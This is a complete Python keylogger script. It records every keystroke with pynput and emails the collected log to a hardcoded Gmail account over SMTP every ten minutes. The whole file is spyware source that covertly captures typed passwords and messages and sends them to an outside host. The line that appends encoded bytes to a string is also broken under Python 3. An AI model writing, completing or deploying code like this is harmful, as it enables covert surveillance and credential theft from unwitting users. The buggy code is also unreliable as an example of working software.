import pynput.keyboard
import smtplib
import threading

log = ""
def callback_function(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)

    print(log)

def send_email(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()

def thread_function():
    global log
    send_email("mail@gmail.com", "password", log)
    log = ""
    timer_object = threading.Timer(600, thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
